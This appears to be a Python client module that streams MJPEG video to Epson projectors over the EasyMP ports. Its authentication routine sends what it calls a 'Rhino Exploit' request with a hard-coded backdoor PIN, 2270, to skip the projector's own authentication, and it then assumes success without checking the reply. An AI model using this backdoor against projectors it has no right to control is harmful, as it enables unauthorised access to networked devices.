import socket
import time
import struct
from . import config
from . import payloads

class ProtocolError(Exception):
    pass

class EpsonEasyMPClient:
    def __init__(self, projector_ip=None, my_ip=None):
        self.projector_ip = projector_ip or config.PROJECTOR_IP
        self.my_ip = my_ip or config.get_local_ip()
        
        # Sockets
        self.s_hardware = None # Port 3629
        self.s_auth = None     # Port 3620
        self.s_video = None    # Port 3621
    
    def connect_and_negotiate(self):
        print(f"[*] Starting deterministic negotiation sequence with {self.projector_ip}...")
        
        try:
            # 2. Authentication Connect (TCP 3620)
            self._authenticate_session()
            
            # 3. Transport Stream Connect (TCP 3621)
            self._open_video_channel()
            
            print("\n[+] BINGO! Connection Fully Established and Ready for Video Stream!")
            return True
                
        except Exception as e:
            print(f"[-] Negotiation failed: {e}")
            self.disconnect()
            return False

    def _authenticate_session(self):
        print(f"[*] 2. Opening Authentication Channel (Port 3620)...")
        self.s_auth = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s_auth.settimeout(5)
        self.s_auth.connect((self.projector_ip, config.PORT_CONTROL))

        # --- AUTHENTICATION SEQUENCE ---
        print("[*]    Sending dynamic Rhino Exploit Auth Request (Backdoor PIN 2270)...")
        auth_payload = payloads.get_auth_payload(self.my_ip, self.projector_ip, pin="2270")
        
        print(f"[*]    Payload length: {len(auth_payload)} bytes")
        self.s_auth.sendall(auth_payload)
        
        print("[*]    Waiting for authentication response...")
        try:
            resp1 = self.s_auth.recv(1024)
            print(f"[+]    Resp 1: {len(resp1)} bytes -> {resp1.hex()[:32]}")
        except socket.timeout:
            print("[-]    Wait/Resp 1 error: timed out")
        except Exception as e:
            print(f"[-]    Wait/Resp 1 error: {e}")

        # Assume SUCCESS if we made it here without getting outright rejected or connection dropped
        print("[+]    Finished playing exploit flow. Assuming authentication state is ready!")


    def _open_video_channel(self):
        print(f"[*] 3. Opening Video Channel (Port 3621)...")
        time.sleep(0.5) # Slight delay purely to let Projector OS transition state
        self.s_video = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s_video.settimeout(5)
        self.s_video.connect((self.projector_ip, config.PORT_VIDEO))
        print("[+]    Video Channel OPEN. Ready to stream PCON-wrapped MJPEG.")

    def send_video_frame(self, x_offset, y_offset, width, height, mjpeg_bytes):
        """Wraps MJPEG stream data in PCON header and sends to Port 3621."""
        if not self.s_video:
            print("[-] Cannot send video frame. Video socket not initialized!")
            return False
            
        try:
            # Construct PCON header
            pcon_header = payloads.get_pcon_video_header(x_offset, y_offset, width, height, len(mjpeg_bytes))
            
            # Send synchronously
            self.s_video.sendall(pcon_header + mjpeg_bytes)
            return True
        except Exception as e:
            print(f"[-] Stream interrupted: {e}")
            return False

    def disconnect(self):
        """Tears down all connections safely."""
        print("[*] Disconnecting client...")
        if self.s_hardware:
            try: self.s_hardware.close()
            except: pass
        if self.s_auth:
            try: self.s_auth.close()
            except: pass
        if self.s_video:
            try: self.s_video.close()
            except: pass
